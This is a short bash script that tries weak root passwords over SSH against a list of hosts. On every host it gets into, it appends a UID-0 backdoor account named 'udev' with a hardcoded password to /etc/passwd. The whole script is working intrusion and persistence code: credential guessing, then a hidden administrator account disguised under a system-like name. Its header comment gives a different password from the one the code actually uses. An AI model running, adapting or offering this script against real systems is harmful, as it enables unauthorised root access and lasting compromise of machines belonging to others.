#!/bin/bash
# adds new entry to /etc/passwd
# Default name is udev, password = getshrektm8
# entries are of form:
#    name:password(salted):UID:GID:uid info/comment:homedir:command/shell


if [ "$(command -v sshpass)" == "" ]; then
    apt-get install sshpass
fi

export NAME="udev"
export PASSWD="whalesyo"
export SALT="xx"

entry=`perl -e 'print "$ENV{NAME}:" . crypt($ENV{PASSWD}, $ENV{SALT}) . ":0:0:/root:/bin/bash\n"'`

routes=( "$@" )

passwords=( "password" "ucsb" )

for route in ${routes[@]} ; do
    for password in ${passwords[@]} ; do
	echo "echo $entry  >> /etc/passwd " | sshpass -p $password ssh root@$route  && echo "Got $route"
    done
done
